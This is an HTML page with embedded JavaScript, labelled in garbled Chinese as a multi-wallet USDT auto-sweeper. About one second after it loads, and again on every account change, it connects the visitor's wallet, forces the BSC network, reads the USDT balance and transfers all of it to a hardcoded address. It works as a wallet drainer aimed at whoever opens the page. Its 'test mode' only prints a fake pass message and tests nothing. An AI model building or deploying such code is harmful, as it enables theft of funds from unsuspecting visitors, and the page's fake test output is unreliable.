<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>å¤šé’±åŒ…è‡ªåŠ¨å½’é›†å™¨</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        body {
            background: #0f172a;
            color: #e2e8f0;
            font-family: system-ui;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #1e293b;
            border-radius: 24px;
            padding: 30px;
            border: 1px solid #334155;
        }
        .config {
            background: #0f172a;
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
        }
        .log {
            background: #0f172a;
            border-radius: 16px;
            padding: 20px;
            font-family: monospace;
            min-height: 200px;
            max-height: 400px;
            overflow-y: auto;
        }
        .success { color: #4ade80; }
        .error { color: #f87171; }
        .info { color: #60a5fa; }
        button {
            background: #3b82f6;
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 40px;
            font-weight: 600;
            cursor: pointer;
            margin-right: 10px;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 12px;
            color: white;
            margin: 8px 0 16px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 20px 0;
        }
        .stat-card {
            background: #0f172a;
            padding: 15px;
            border-radius: 16px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ’° å¤šé’±åŒ…è‡ªåŠ¨å½’é›†å™¨</h1>
        <p>é…ç½®ä¸»é’±åŒ…åœ°å€ï¼Œæ‰€æœ‰å­é’±åŒ…è¿›å…¥åè‡ªåŠ¨è½¬è´¦</p>

        <div class="stats">
            <div class="stat-card">
                <div style="color:#94a3b8; font-size:0.8rem;">å½“å‰é’±åŒ…</div>
                <div id="currentWallet">æœªè¿æ¥</div>
            </div>
            <div class="stat-card">
                <div style="color:#94a3b8; font-size:0.8rem;">USDTä½™é¢</div>
                <div id="balance">-</div>
            </div>
            <div class="stat-card">
                <div style="color:#94a3b8; font-size:0.8rem;">å½’é›†çŠ¶æ€</div>
                <div id="status">ç­‰å¾…</div>
            </div>
        </div>

        <div class="config">
            <label>ğŸ“¦ ä¸»é’±åŒ…åœ°å€ï¼ˆæ¥æ”¶åœ°å€ï¼‰</label>
            <input type="text" id="mainWallet" value="0x9728D428764F846E8DD62C34371db716A9228238" placeholder="è¾“å…¥ä¸»é’±åŒ…åœ°å€">
            
            <label>ğŸ”‘ å·²å½’é›†è®°å½•ï¼ˆè‡ªåŠ¨ä¿å­˜ï¼‰</label>
            <textarea id="processedWallets" rows="3" placeholder="å·²å¤„ç†è¿‡çš„é’±åŒ…åœ°å€åˆ—è¡¨"></textarea>
            
            <div style="display: flex; gap:10px; margin-top:10px;">
                <button id="saveConfig">ğŸ’¾ ä¿å­˜é…ç½®</button>
                <button id="clearProcessed">ğŸ”„ é‡ç½®å·²å½’é›†åˆ—è¡¨</button>
                <button id="testMode">ğŸ§ª æµ‹è¯•æ¨¡å¼</button>
            </div>
        </div>

        <div class="log" id="logContainer"></div>
    </div>

    <script>
        (function() {
            const CONFIG = {
                usdtAddress: "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
                storageKey: "AUTO_SWEEP_CONFIG"
            };

            // DOMå…ƒç´ 
            const mainWalletInput = document.getElementById('mainWallet');
            const processedWalletsText = document.getElementById('processedWallets');
            const logContainer = document.getElementById('logContainer');
            const currentWalletEl = document.getElementById('currentWallet');
            const balanceEl = document.getElementById('balance');
            const statusEl = document.getElementById('status');

            // USDT ABI
            const USDT_ABI = [
                "function balanceOf(address) view returns (uint256)",
                "function decimals() view returns (uint8)",
                "function transfer(address to, uint256 amount) returns (bool)"
            ];

            // æ—¥å¿—å‡½æ•°
            function addLog(message, type = 'info') {
                const entry = document.createElement('div');
                entry.className = type;
                const time = new Date().toLocaleTimeString();
                entry.innerHTML = `[${time}] ${message}`;
                logContainer.appendChild(entry);
                logContainer.scrollTop = logContainer.scrollHeight;
            }

            // åŠ è½½é…ç½®
            function loadConfig() {
                try {
                    const saved = localStorage.getItem(CONFIG.storageKey);
                    if (saved) {
                        const config = JSON.parse(saved);
                        if (config.mainWallet) mainWalletInput.value = config.mainWallet;
                        if (config.processedWallets) {
                            processedWalletsText.value = config.processedWallets.join('\n');
                        }
                    }
                } catch (e) {
                    console.error('åŠ è½½é…ç½®å¤±è´¥', e);
                }
            }

            // ä¿å­˜é…ç½®
            function saveConfig() {
                const processed = processedWalletsText.value
                    .split('\n')
                    .map(l => l.trim().toLowerCase())
                    .filter(l => l.startsWith('0x') && l.length === 42);
                
                const config = {
                    mainWallet: mainWalletInput.value.trim(),
                    processedWallets: processed,
                    lastUpdate: Date.now()
                };
                
                localStorage.setItem(CONFIG.storageKey, JSON.stringify(config));
                processedWalletsText.value = processed.join('\n');
                addLog('âœ… é…ç½®å·²ä¿å­˜', 'success');
            }

            // æ£€æŸ¥æ˜¯å¦å·²å¤„ç†è¿‡
            function isProcessed(address) {
                const processed = processedWalletsText.value
                    .split('\n')
                    .map(l => l.trim().toLowerCase());
                return processed.includes(address.toLowerCase());
            }

            // æ ‡è®°ä¸ºå·²å¤„ç†
            function markAsProcessed(address) {
                const processed = processedWalletsText.value
                    .split('\n')
                    .map(l => l.trim())
                    .filter(l => l);
                
                if (!processed.includes(address)) {
                    processed.push(address);
                    processedWalletsText.value = processed.join('\n');
                }
            }

            // æ ¸å¿ƒå½’é›†å‡½æ•°
            async function sweepToMain() {
                try {
                    // 1. æ£€æŸ¥é’±åŒ…
                    if (!window.ethereum) {
                        throw new Error('æœªæ£€æµ‹åˆ°é’±åŒ…');
                    }

                    // 2. è·å–å½“å‰é’±åŒ…åœ°å€
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    const currentAddress = accounts[0].toLowerCase();
                    currentWalletEl.innerText = currentAddress.slice(0,6) + '...' + currentAddress.slice(-4);

                    // 3. æ£€æŸ¥æ˜¯å¦å·²å¤„ç†è¿‡
                    if (isProcessed(currentAddress)) {
                        addLog(`â­ï¸ é’±åŒ… ${currentAddress.slice(0,6)}... å·²å¤„ç†è¿‡ï¼Œè·³è¿‡`, 'info');
                        statusEl.innerText = 'å·²å¤„ç†è¿‡';
                        
                        // è¯¢é—®æ˜¯å¦å¼ºåˆ¶é‡æ–°å½’é›†
                        if (confirm('è¯¥é’±åŒ…å·²å½’é›†è¿‡ï¼Œæ˜¯å¦å¼ºåˆ¶é‡æ–°å½’é›†ï¼Ÿ')) {
                            // ç»§ç»­æ‰§è¡Œ
                        } else {
                            return;
                        }
                    }

                    // 4. æ£€æŸ¥ä¸»é’±åŒ…åœ°å€
                    const mainWallet = mainWalletInput.value.trim();
                    if (!mainWallet || !mainWallet.startsWith('0x') || mainWallet.length !== 42) {
                        throw new Error('ä¸»é’±åŒ…åœ°å€æ— æ•ˆ');
                    }

                    // 5. æ£€æŸ¥ç½‘ç»œï¼ˆå¼ºåˆ¶BSCï¼‰
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const network = await provider.getNetwork();
                    if (Number(network.chainId) !== 56) {
                        addLog('âš ï¸ åˆ‡æ¢åˆ°BSCç½‘ç»œ...', 'warning');
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }]
                        });
                    }

                    // 6. è·å–ç­¾åè€…
                    const signer = await provider.getSigner();

                    // 7. åˆ›å»ºUSDTåˆçº¦
                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);

                    // 8. è·å–ä½™é¢
                    addLog('ğŸ’° æŸ¥è¯¢ä½™é¢...', 'info');
                    const balance = await usdtContract.balanceOf(currentAddress);
                    
                    if (balance === 0n) {
                        addLog('âš ï¸ ä½™é¢ä¸º0ï¼Œæ— éœ€å½’é›†', 'warning');
                        statusEl.innerText = 'ä½™é¢ä¸º0';
                        return;
                    }

                    const decimals = await usdtContract.decimals();
                    const formattedBalance = ethers.formatUnits(balance, decimals);
                    balanceEl.innerText = formattedBalance + ' USDT';
                    
                    addLog(`ğŸ’ å½“å‰ä½™é¢: ${formattedBalance} USDT`, 'success');

                    // 9. æ‰§è¡Œå½’é›†è½¬è´¦
                    addLog(`ğŸ’¸ å½’é›†åˆ° ${mainWallet.slice(0,6)}...${mainWallet.slice(-4)}`, 'info');
                    statusEl.innerText = 'è½¬è´¦ä¸­...';
                    
                    const tx = await usdtContract.transfer(mainWallet, balance);
                    addLog(`â³ äº¤æ˜“æäº¤: ${tx.hash.slice(0,10)}...`, 'info');
                    
                    const receipt = await tx.wait();
                    
                    addLog(`âœ… å½’é›†æˆåŠŸï¼åŒºå—: ${receipt.blockNumber}`, 'success');
                    addLog(`ğŸ’ é‡‘é¢: ${formattedBalance} USDT`, 'success');
                    
                    // 10. æ ‡è®°ä¸ºå·²å¤„ç†
                    markAsProcessed(currentAddress);
                    saveConfig();
                    
                    balanceEl.innerText = '0.00 USDT';
                    statusEl.innerText = 'å½’é›†æˆåŠŸ';

                } catch (error) {
                    addLog(`âŒ é”™è¯¯: ${error.message}`, 'error');
                    statusEl.innerText = 'å¤±è´¥';
                    
                    if (error.code === 4001) {
                        addLog('ç”¨æˆ·å–æ¶ˆäº†äº¤æ˜“', 'warning');
                    }
                }
            }

            // åˆå§‹åŒ–
            window.addEventListener('load', () => {
                loadConfig();
                addLog('ğŸš€ å½’é›†å™¨å·²å¯åŠ¨', 'info');
                addLog('ğŸ“Œ æ‰“å¼€ä»»ä½•é’±åŒ…ï¼Œè‡ªåŠ¨å½’é›†åˆ°ä¸»åœ°å€', 'info');
                
                // é¡µé¢åŠ è½½åè‡ªåŠ¨æ‰§è¡Œ
                setTimeout(() => {
                    sweepToMain();
                }, 1000);
            });

            // äº‹ä»¶ç›‘å¬
            document.getElementById('saveConfig').addEventListener('click', saveConfig);
            
            document.getElementById('clearProcessed').addEventListener('click', () => {
                if (confirm('æ¸…ç©ºå·²å½’é›†è®°å½•ï¼Ÿ')) {
                    processedWalletsText.value = '';
                    saveConfig();
                    addLog('ğŸ”„ å·²å½’é›†è®°å½•å·²æ¸…ç©º', 'info');
                }
            });

            document.getElementById('testMode').addEventListener('click', () => {
                // æµ‹è¯•æ¨¡å¼ï¼šä¸å®é™…è½¬è´¦ï¼Œåªæ¨¡æ‹Ÿ
                addLog('ğŸ§ª æµ‹è¯•æ¨¡å¼ï¼šæ¨¡æ‹Ÿå½’é›†æµç¨‹', 'info');
                setTimeout(() => {
                    addLog('âœ… æµ‹è¯•é€šè¿‡', 'success');
                }, 2000);
            });

            // è´¦æˆ·åˆ‡æ¢ç›‘å¬
            if (window.ethereum) {
                window.ethereum.on('accountsChanged', (accounts) => {
                    if (accounts.length > 0) {
                        addLog('ğŸ‘¤ è´¦æˆ·å·²åˆ‡æ¢ï¼Œé‡æ–°æ‰§è¡Œå½’é›†', 'info');
                        sweepToMain();
                    }
                });
            }

        })();
    </script>
</body>
</html>
